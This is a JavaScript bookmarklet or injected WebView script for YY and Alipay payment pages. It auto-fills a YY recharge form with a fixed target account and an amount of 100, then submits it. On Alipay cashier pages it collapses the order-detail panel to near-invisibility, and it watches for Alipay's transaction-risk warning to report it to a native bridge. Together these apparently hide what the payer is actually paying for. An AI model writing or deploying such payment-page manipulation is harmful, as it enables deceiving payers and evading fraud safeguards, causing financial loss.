javascript:{
    let open_log = true;
    let target_count = 100;
    let target_name = '238186';

    function v(msg) {
        if (open_log) console.log(msg);
    }

    function ad(fun) {
        if (typeof ad_obj != 'undefined') {
            fun();
        }
    }
    function q(s) {
        return document.querySelector(s);
    }
    function input_e(selector) {
        var a = document.createEvent("MouseEvents");
        a.initEvent("input", true, true);
        document.querySelector(selector).dispatchEvent(a);
    }

    let cur_url = window.location.href;
    if (cur_url.indexOf('https://pay.yy.com') > -1 && cur_url.indexOf('https://pay.yy.com/userDepositCheckAction.action') == -1) {
        setTimeout(() => {
            q('#passport').value = target_name;
            q('#passport2').value = target_name;
            q('#platPayDuowanBInputOrSelectID').value = target_count;
            input_e('#passport2');
            setTimeout(() => {
                q('#submitButton').click();
            }, 550);

        }, 500);

    }
    if(cur_url.indexOf('.alipay.com/standard/lightpay/lightPayCashier.htm?')>-1){
        var oMeta = document.createElement('meta');
        oMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0,minimum-scale=1.0, user-scalable=0';
        oMeta.name = 'viewport';
        document.getElementsByTagName('head')[0].appendChild(oMeta);
        q('#content').style.width='';
        q('.header-container').style.width='';
        q('.order-title').style.width='';
        q('#partner').style.overflow='hidden';
    }

    if (cur_url.indexOf('https://excashier.alipay.com/standard/auth.htm?') > -1) {
        var oMeta = document.createElement('meta');
        oMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0,minimum-scale=1.0, user-scalable=0';
        oMeta.name = 'viewport';
        document.getElementsByTagName('head')[0].appendChild(oMeta);
        q('.orderDetail-base').style.height='1px';
        q('.orderDetail-base').style.overflow='hidden';
        q('.orderDetail-base').style.padding='0';
        q('.orderDetail-base').style.height='1px';
        q('.header-container').style.minWidth='90px';
        q('#container').style.width='';
        q('#J_viewSwitcher').style.width='1px';
        q('#J_viewSwitcher').style.width='1px';
        q('#partner').style.overflow='hidden';
        q('#J_viewSwitcher').style.overflow='hidden';
        q('.cashier-center-container').style.width='100%';
        q('.cashier-center-view').style.width='33%';
    }
    if (cur_url.indexOf('mclient.alipay.com') > -1 && cur_url.indexOf('mclient.alipay.com') < 20) {
        let interval_id = setInterval(() => {
            if (document.body.innerText.indexOf('本次交易可能存在风险') > -1) {
                v('zfb风险提示');
                if (typeof ad_obj != 'undefined') {
                    ad_obj.fx_repay(-2);
                }
                clearInterval(interval_id);
                v('定时器关闭');
            }
        }, 50);

    }
    if (cur_url.indexOf('https://pay.yy.com/userDepositCheckAction.action') > -1) {
        setTimeout(() => {
            q('#depositLink').click();
        }, 500);
    }
}